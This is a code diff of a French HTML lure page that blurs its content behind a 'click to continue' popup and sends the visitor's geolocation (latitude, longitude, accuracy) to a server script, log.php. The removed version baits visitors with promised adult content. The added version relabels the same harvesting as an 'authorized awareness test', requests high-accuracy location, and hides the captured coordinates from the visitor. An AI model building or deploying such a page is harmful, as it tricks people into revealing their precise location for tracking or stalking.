@@ -1,122 +1,72 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Contenu sensible</title>
-
+<meta charset="UTF-8" />
+<title>Accès au contenu</title>
 <style>
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #0f172a;
-    color: white;
-    height: 100vh;
-    overflow: hidden;
-}
-
-.page {
-    padding: 40px;
-    filter: blur(8px);
-    pointer-events: none;
-}
-
-.overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.75);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 10;
-}
-
-.popup {
-    background: #020617;
-    padding: 30px;
-    border-radius: 12px;
-    text-align: center;
-    max-width: 400px;
-    width: 90%;
-}
-
-button {
-    margin-top: 20px;
-    padding: 12px 20px;
-    border: none;
-    border-radius: 8px;
-    background: #2563eb;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-}
-
-button:hover {
-    background: #1d4ed8;
-}
-
-pre {
-    margin-top: 20px;
-    background: #020617;
-    padding: 15px;
-    border-radius: 8px;
-    font-size: 13px;
-}
+  body{margin:0;font-family:Arial;background:#0f172a;color:#fff;height:100vh;overflow:hidden}
+  .page{padding:40px;filter:blur(8px);pointer-events:none;transition:.3s}
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;z-index:10}
+  .popup{background:#020617;padding:28px;border-radius:12px;max-width:420px;width:90%;text-align:center;box-shadow:0 0 30px rgba(0,0,0,.6)}
+  .popup p{color:#cbd5f5;font-size:14px;line-height:1.35}
+  button{margin-top:18px;padding:12px 20px;border:0;border-radius:8px;background:#2563eb;color:#fff;font-size:16px;cursor:pointer}
+  button:hover{background:#1d4ed8}
+  .status{margin-top:16px;color:#cbd5f5;font-size:14px}
 </style>
 </head>
-
 <body>
 
-<!-- POPUP -->
 <div class="overlay" id="overlay">
-    <div class="popup">
-        <h2>Accès au contenu</h2>
-        <p>
-            Cliquez sur continuer pour accéder à la page.
-        </p>
-        <button onclick="continueAccess()">Cliquer pour continuer</button>
-    </div>
+  <div class="popup">
+    <h2>Accès au contenu</h2>
+    <p>
+      Test interne autorisé : en cliquant sur “Continuer”, vous acceptez de partager votre localisation
+      afin de valider le scénario de sensibilisation (données enregistrées par l’équipe sécurité).
+    </p>
+    <button onclick="continueAccess()">Cliquer pour continuer</button>
+    <div class="status" id="status"></div>
+  </div>
 </div>
 
-<!-- CONTENU -->
 <div class="page" id="page">
-    <h1>J'espere que sa à pu te faire sourire un peu dans ce moment difficile</h1>
-    <p>Cliquer pour voir le contenu + 18
-</p>
-    <pre id="result"></pre>
+  <h1>Contenu</h1>
+  <p>Accès accordé. Merci pour votre participation au test.</p>
 </div>
 
 <script>
-function continueAccess() {
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            fetch("log.php", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body:
-                    "lat=" + pos.coords.latitude +
-                    "&lon=" + pos.coords.longitude +
-                    "&acc=" + pos.coords.accuracy
-            });
+async function continueAccess() {
+  const status = document.getElementById("status");
+  status.textContent = "Demande d’autorisation en cours…";
 
-            document.getElementById("overlay").style.display = "none";
-            document.getElementById("page").style.filter = "none";
-            document.getElementById("page").style.pointerEvents = "auto";
+  if (!navigator.geolocation) {
+    status.textContent = "Géolocalisation non supportée.";
+    return;
+  }
 
-            document.getElementById("result").textContent =
-`Position enregistrée :
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      try {
+        // Envoi au serveur (vous récupérez tout dans logs.txt)
+        await fetch("log.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: `lat=${encodeURIComponent(pos.coords.latitude)}&lon=${encodeURIComponent(pos.coords.longitude)}&acc=${encodeURIComponent(pos.coords.accuracy)}`
+        });
 
-Latitude  : ${pos.coords.latitude}
-Longitude : ${pos.coords.longitude}
-Précision : ${pos.coords.accuracy} m
-
-(Test pédagogique)`;
-        },
-        () => {
-            alert("Accès refusé.");
-        }
-    );
+        // Déverrouille la page, sans afficher les coordonnées
+        document.getElementById("overlay").style.display = "none";
+        const page = document.getElementById("page");
+        page.style.filter = "none";
+        page.style.pointerEvents = "auto";
+      } catch (e) {
+        status.textContent = "Erreur d’envoi au serveur.";
+      }
+    },
+    () => {
+      status.textContent = "Accès refusé (permission non accordée).";
+    },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
 }
 </script>
 
